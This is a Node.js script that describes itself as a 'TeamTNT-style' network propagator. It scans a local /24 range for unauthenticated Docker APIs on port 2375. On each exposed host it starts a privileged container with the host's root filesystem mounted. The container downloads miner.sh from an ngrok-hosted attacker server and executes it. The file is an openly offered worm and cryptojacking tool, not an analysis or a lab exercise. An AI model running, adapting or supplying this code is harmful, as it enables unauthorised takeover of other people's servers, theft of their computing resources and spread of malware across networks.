const axios = require('axios');
const argparse = require('argparse');
const winston = require('winston');
const net = require('net');
const os = require('os');

// Configure logging for this script
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(({ timestamp, level, message }) => `${timestamp} - ${level.toUpperCase()}: ${message}`)
    ),
    transports: [
        new winston.transports.File({ filename: 'propagator.log' }),
        new winston.transports.Console()
    ]
});

// Resource usage configurations for the scanner itself
const MODE_CONFIGS = {
    low: { threads: 10, delay: 1000, mode: 'low' },
    medium: { threads: 30, delay: 500, mode: 'medium' },
    high: { threads: 50, delay: 250, mode: 'high' }
};

// Base configuration matching the other scripts
const CONFIG = {
    ATTACKER_IP: 'a834-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app',
    ATTACKER_PORT: '8080',
    DOCKER_PORT: 2375,
    TIMEOUT: 3000
};

/**
 * Checks if a Docker API port is open on a target IP.
 * @param {string} targetIp - The IP address to check.
 * @returns {Promise<boolean>} - True if the port is open, false otherwise.
 */
async function checkDockerApi(targetIp) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(CONFIG.TIMEOUT);

        socket.on('connect', () => {
            socket.destroy();
            resolve(true); // Port is open
        });
        socket.on('error', () => resolve(false));
        socket.on('timeout', () => resolve(false));

        socket.connect(CONFIG.DOCKER_PORT, targetIp);
    });
}

/**
 * Exploits an open Docker API by deploying the miner.sh container.
 * @param {string} targetIp - The vulnerable IP address.
 * @param {object} modeConfig - The resource mode for the deployed miner.
 * @returns {Promise<boolean>} - True if exploitation was successful.
 */
async function exploitDockerApi(targetIp, modeConfig) {
    const attackerUrl = `http://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}`;
    // The command downloads and runs the main shell payload
    const command = `sh -c 'wget ${attackerUrl}/miner.sh -O /tmp/miner.sh && chmod +x /tmp/miner.sh && /tmp/miner.sh --mode ${modeConfig.mode}'`;

    const containerConfig = {
        Image: "alpine:latest",
        Cmd: command.split(' '),
        HostConfig: {
            Privileged: true,
            Binds: ["/:/mnt"]
        }
    };

    try {
        // Create the container
        const createResponse = await axios.post(`http://${targetIp}:${CONFIG.DOCKER_PORT}/containers/create`, containerConfig, { timeout: CONFIG.TIMEOUT });
        
        if (createResponse.status === 201) { // 201 Created
            const containerId = createResponse.data.Id;
            logger.info(`Container created on ${targetIp}`);
            
            // Start the container
            const startResponse = await axios.post(`http://${targetIp}:${CONFIG.DOCKER_PORT}/containers/${containerId}/start`, {}, { timeout: CONFIG.TIMEOUT });
            if (startResponse.status === 204) { // 204 No Content (Success)
                logger.info(`SUCCESS: Miner propagated to ${targetIp} in ${modeConfig.mode} mode.`);
                return true;
            }
        }
        return false;
    } catch (error) {
        if (error.response) {
            logger.debug(`Failed to exploit ${targetIp}. Status: ${error.response.status}`);
        } else {
            logger.debug(`Failed to exploit ${targetIp}: ${error.message}`);
        }
        return false;
    }
}

/**
 * Scans a given IP range for open Docker APIs and attempts to exploit them.
 * @param {string} ipRange - The base IP range (e.g., '192.168.1').
 * @param {object} modeConfig - The configuration for scanning speed and payload deployment.
 */
async function scanIpRange(ipRange, modeConfig) {
    const baseIp = ipRange || os.networkInterfaces().eth0?.[0]?.address?.split('.').slice(0, 3).join('.') || '192.168.1';
    const targets = [];
    for (let i = 1; i <= 254; i++) {
        targets.push(`${baseIp}.${i}`);
    }

    logger.info(`Starting local network scan on range ${baseIp}.* in ${modeConfig.mode} mode.`);
    logger.info(`Concurrency: ${modeConfig.threads} threads, Delay: ${modeConfig.delay}ms`);

    const { RateLimit } = require('async-sema');
    const limit = RateLimit(modeConfig.threads);

    const scanPromises = targets.map(async (targetIp) => {
        await limit();
        try {
            const isVulnerable = await checkDockerApi(targetIp);
            if (isVulnerable) {
                logger.info(`Vulnerable Docker API found at: ${targetIp}`);
                await exploitDockerApi(targetIp, modeConfig);
            }
        } catch (e) {
            logger.error(`Error scanning ${targetIp}: ${e.message}`);
        }
        await new Promise(resolve => setTimeout(resolve, modeConfig.delay));
    });

    await Promise.all(scanPromises);
    logger.info("Local network scan complete.");
}

/**
 * Main function to parse arguments and start the scanner.
 */
async function main() {
    const parser = new argparse.ArgumentParser({ description: 'TeamTNT-style local network propagator for Docker.' });
    parser.add_argument('--mode', { choices: ['low', 'medium', 'high'], default: 'medium', help: 'Scanning and deployment mode.' });
    parser.add_argument('--ip-range', { help: 'Specify a /24 IP range base to scan (e.g., 10.0.0).' });
    
    const args = parser.parse_args();
    const modeConfig = MODE_CONFIGS[args.mode];
    
    await scanIpRange(args.ip_range, modeConfig);
}

main().catch(error => {
    logger.error(`Fatal error in propagator: ${error.message}`);
    process.exit(1);
});
